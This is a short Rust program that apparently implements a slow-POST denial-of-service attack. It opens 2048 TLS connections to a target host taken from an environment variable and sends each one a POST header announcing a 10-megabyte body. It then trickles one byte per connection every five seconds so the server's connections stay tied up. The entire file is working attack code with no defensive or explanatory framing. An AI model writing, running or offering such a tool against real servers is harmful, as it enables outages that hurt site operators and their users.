extern crate futures;
extern crate futures_cpupool;
extern crate native_tls;

extern crate tokio_core;
extern crate tokio_timer;

use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;

use futures::*;
use tokio_core::reactor::{Core, Interval};
use tokio_timer::*;

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let timeout = 5;
    let connections_count = 2048;

    let mut core = Core::new().unwrap();
    let handle = core.handle();

    let start = format!("POST /somepostpath HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
    let connections_stream: Vec<Result<u32, ()>> = (0..connections_count).map(|i| Ok(i)).collect();
    let runner = stream::iter(connections_stream).for_each(move |connection_number| {
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
        let mut stream = connector.connect(&host, stream).unwrap();
        stream.write(start.as_bytes());
        stream.flush();

        let timer = Timer::default().interval(Duration::from_secs(timeout));
        let timer = Interval::new(Duration::from_secs(timeout), &handle).unwrap();
        let timer = timer.for_each(move |_| {
            stream.write(b"a");
            stream.flush();
            println!("Stream number: {} written.", connection_number);
            Ok(())
        });
        let task = handle.spawn(timer.map_err(|_| println!("HIHI")));
        println!("Stream number: {} spawned.", connection_number);
        Ok(())
    });
    core.run(runner);
}